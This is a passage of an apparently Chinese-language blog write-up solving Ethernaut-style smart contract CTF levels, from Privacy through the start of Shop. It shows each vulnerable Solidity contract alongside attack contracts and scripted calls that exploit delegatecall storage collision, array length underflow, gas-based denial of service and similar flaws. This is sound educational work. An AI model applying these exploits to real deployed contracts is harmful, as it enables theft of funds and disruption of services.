<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此题目storage布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (31)    |          locked(1)               | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       ID(32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (28) | awkwardness(2) |  denomination (1)  | flattening(1)  | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| data[0](32)                                       | &lt;- slot 3</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| data[1](32)                                       | &lt;- slot 4</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| data[2](32)                                       | &lt;- slot 5</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>题目使用<code>bytes16</code>截断了<code>bytes32</code>的数据，<code>solidity</code>会保留前半部分。对于<code>uint</code>类的则会保留后半部分。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">problem.GetContract()</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;unlock&#x27;</span>, [problem.ViewStorage(<span class="number">5</span>)[:<span class="number">16</span>]])</span><br></pre></td></tr></table></figure>
<h2 id="level13-gatekeeper-one">level13 Gatekeeper One</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数学题。对于汽油费，可以通过在etherscan上通过失败的<code>transaction hash</code>查看<code>Geth Debug Trace</code>中的指令。查找<code>GAS</code>指令后的剩余数量来调控。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    GatekeeperOne GK = GatekeeperOne(0xBbd77b0251bF99A16D0366aCd0d56473f5d824e5);</span><br><span class="line">    bytes8 _gateKey;</span><br><span class="line">    </span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        GK.enter(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _gateKey = bytes8(uint64(uint160(msg.sender)) &amp; 0xffff0000ffff);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level14-gatekeeper-two">level14 Gatekeeper Two</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目合约即要求通过一个合约调用，又要求调用者的代码长度为0。注意到合约在构建的时候代码长度为0，我们在<code>constructor</code>函数中攻击即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperTwo &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    GatekeeperTwo GK = GatekeeperTwo(0x47e53C6F0021fE5B79eA69c77ed679608Fc877f3);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        GK.enter(bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level15-naught-coin">level15 Naught Coin</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目合约错误地认为<code>ERC20</code>标准只有<code>transfer</code>函数可以向外转账。函数<code>function approve(address spender, uint256 value)</code>允许<code>msg.sender</code>向<code>spender</code>添加<code>value</code>的许可。函数<code>function transferFrom(address from, address to, uint256 value)</code>允许<code>from</code>向<code>to</code>转账，同时消耗<code>from</code>向<code>msg.sender</code>的许可总计<code>value</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">problem.GetContract()</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;approve&#x27;</span>, [problem.ViewCall(<span class="string">&#x27;player&#x27;</span>, []), problem.ViewCall(<span class="string">&#x27;balanceOf&#x27;</span>, [problem.ViewCall(<span class="string">&#x27;player&#x27;</span>, [])])])</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;transferFrom&#x27;</span>, [problem.ViewCall(<span class="string">&#x27;player&#x27;</span>, []), <span class="string">&#x27;0xeB8aff2f8147bd26C63a4271e76Dd82B964A2E69&#x27;</span>, problem.ViewCall(<span class="string">&#x27;balanceOf&#x27;</span>, [problem.ViewCall(<span class="string">&#x27;player&#x27;</span>, [])])])</span><br></pre></td></tr></table></figure>
<h2 id="level16-preservation">level16 Preservation</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到题目使用了<code>delegatecall</code>来调用库函数。当被调函数中发生访存时，将会依照<code>storage</code>的插槽索引变量。即，当运行<code>setFirstTime</code>函数后实际更改的是题目合约中的<code>timeZone1Library</code>变量，而非<code>storedTime</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address tmp1;</span><br><span class="line">    address tmp2;</span><br><span class="line">    uint256 owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        owner = _time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">problem.GetContract()</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;setFirstTime&#x27;</span>, [Attack Contract Address])</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;setFirstTime&#x27;</span>, [My Wallet Address])</span><br></pre></td></tr></table></figure>
<h2 id="level17-recovery">level17 Recovery</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以在<code>etherscan</code>上追踪前的流向看出来。</p>
<p>其实，合约地址的生成是有规律可寻的。经常可以看到有的通证或组织跨链部署的合约都是同样的，这是因为合约地址是根据创建者的地址及nonce来计算的，两者先进行RLP编码再利用keccak256进行哈希计算，在最终的结果取后20个字节作为地址。</p>
<ul>
<li>创建者的地址是已知的，而nonce也是从初始值递增获取到的。</li>
<li>外部地址nonce初始值为0，每次转账或创建合约等会导致nonce加一</li>
<li>合约地址nonce初始值为1，每次创建合约会导致nonce加一（内部调用不会）</li>
</ul>
<h2 id="level18-magicnumber">level18 MagicNumber</h2>
<p>手搓字节码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">    <span class="keyword">from</span> : player,</span><br><span class="line">    data : <span class="string">&quot;0x600a600c602039600a6020f3602a60605260206060f3&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="level19-alien-codex">level19 Alien Codex</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>solidity</code>的动态数组在访问时会自动检查是否出界，这使得<code>revise()</code>函数没有相关的检查。<code>retract()</code>函数可以通过让<code>length--</code>的方法删除末尾的一个元素，但没有检查下溢。对于动态数组，<code>solidity</code>会在本应存储内容的插槽<code>p</code>上存储数组的长度，真正的内容在插槽<code>keccak256(uint256(p))</code>的位置开始存储。因此，我们可以通过下溢扩大数组的访问空间，再修改<code>owner</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">problem.GetContract()</span><br><span class="line">codex = <span class="number">80084422859880547211683076133703299733277748156566366325829078699459944778998</span></span><br><span class="line">problem.PayableCall(<span class="string">&#x27;makeContact&#x27;</span>, [])</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;retract&#x27;</span>, [])</span><br><span class="line">problem.PayableCall(<span class="string">&#x27;revise&#x27;</span>, [<span class="number">2</span> ** <span class="number">256</span> - codex, long_to_bytes(<span class="number">0x8F4Bd3d8d348dB262c487366065F21dB95BFcB23</span>).rjust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)])</span><br></pre></td></tr></table></figure>
<h2 id="level20-denial">level20 Denial</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目采用<code>call</code>来转账但是并没有限制汽油量，可以通过限制汽油量来实现拒绝转账。在<code>0.6.0</code>时<code>assert()</code>函数失败后会吞掉所有的汽油费，而在<code>0.8.0</code>则只会吞掉执行至此的汽油费。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        assert(1 == 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level21-shop">level21 Shop</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public 